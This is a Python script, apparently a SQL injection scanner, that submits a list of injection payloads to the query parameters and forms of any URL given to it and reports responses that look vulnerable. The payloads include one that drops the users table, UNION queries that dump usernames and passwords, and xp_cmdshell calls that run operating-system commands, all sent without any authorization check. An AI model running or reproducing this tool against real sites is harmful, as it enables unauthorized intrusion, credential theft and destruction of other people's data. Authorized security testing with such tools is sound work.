import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Define a broader set of SQL injection payloads
sql_payloads = [
    "' UNION SELECT 1, version(), database() --",
    "' UNION SELECT 1, table_name, column_name FROM information_schema.columns --",
    "' UNION SELECT 1, group_concat(username), group_concat(password) FROM users --",
    "'; DROP TABLE users; --",
    "'; SELECT * FROM users WHERE id=1 AND 1=IF(1=1,SLEEP(5),0) --",
    "' OR SLEEP(5) --",
    "' OR username='admin' --",
    "' OR IF(1=1, SLEEP(5), 0) --",
    "' OR IF(username='admin', SLEEP(5), 0) --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "' OR 1=1 #",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' /*",
    "1' OR '1'='1' #",
    "1' OR 1=1",
    "1' OR 1=1 --",
    "1' OR 1=1 /*",
    "1' OR 1=1 #",
    "'; EXEC xp_cmdshell('dir'); --",
    "'; EXEC xp_cmdshell('whoami'); --",
    "' OR 1=1--",
    "' OR '1'='1'--",
    "' OR ''='"
]

def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find_all('form')

def get_form_details(form):
    action = form.attrs.get('action', '').lower()
    method = form.attrs.get('method', 'get').lower()
    inputs = []
    for input_tag in form.find_all(['input', 'textarea', 'select']):
        input_type = input_tag.attrs.get('type', 'text')
        input_name = input_tag.attrs.get('name')
        input_value = input_tag.attrs.get('value', '')
        inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
    return {'action': action, 'method': method, 'inputs': inputs}

def is_vulnerable(response):
    error_messages = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "sql error",
        "sql syntax",
        "mysql_fetch_array() expects parameter 1 to be resource",
        "mysql_num_rows() expects parameter 1 to be resource",
        "unknown column",
        "unknown table",
        "unexpected token",
        "database error",
        "mysql error",
        "postgresql error",
        "syntax error",
        "internal server error"
    ]
    if any(error_message in response.text.lower() for error_message in error_messages):
        return True
    if response.elapsed.total_seconds() > 5:
        return True
    return False

def check_query_parameters(url, payloads):
    for payload in payloads:
        if '?' in url:
            base_url, params = url.split('?', 1)
            params = params.split('&')
            for i in range(len(params)):
                param, value = params[i].split('=', 1)
                params[i] = f"{param}={payload}"
                target_url = f"{base_url}?{'&'.join(params)}"
                response = requests.get(target_url)
                if is_vulnerable(response):
                    print(f"[+] {url} is vulnerable to SQL injection with query parameter payload: {payload}")
                    return True
    return False

def check_forms(url, payloads):
    forms = get_forms(url)
    session = requests.Session()  # Use a session to handle cookies and sessions
    for form in forms:
        form_details = get_form_details(form)
        for payload in payloads:
            data = {}
            for input in form_details['inputs']:
                if input['type'] in ['text', 'password', 'textarea']:
                    data[input['name']] = payload
                elif input['type'] == 'hidden':
                    data[input['name']] = input['value']
                else:
                    data[input['name']] = 'test'

            full_url = urljoin(url, form_details['action']) if form_details['action'] else url
            print(f"Testing form action: {full_url} with method: {form_details['method'].upper()} and data: {data}")

            if form_details['method'] == 'post':
                response = session.post(full_url, data=data)
            else:
                response = session.get(full_url, params=data)

            print(f"Response URL: {response.url}")
            print(f"Response Status Code: {response.status_code}")
            print(f"Response Text Snippet: {response.text[:200]}...")  # Print a snippet of the response text for debugging

            if is_vulnerable(response):
                print(f"[+] {url} is vulnerable to SQL injection with form payload: {payload}")
                return True
    return False

def check_sql_injection(url):
    payloads = sql_payloads
    vulnerable = False

    # Check if URL contains query parameters
    if '?' in url:
        vulnerable = check_query_parameters(url, payloads)

    # Check forms for SQL injection
    if not vulnerable:
        vulnerable = check_forms(url, payloads)

    if not vulnerable:
        print(f"[-] {url} does not appear to be vulnerable to SQL injection.")

    return vulnerable

def check_vulnerabilities(url):
    check_sql_injection(url)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: web-scanner <URL>")
        sys.exit(1)
    url = sys.argv[1]
    check_vulnerabilities(url)
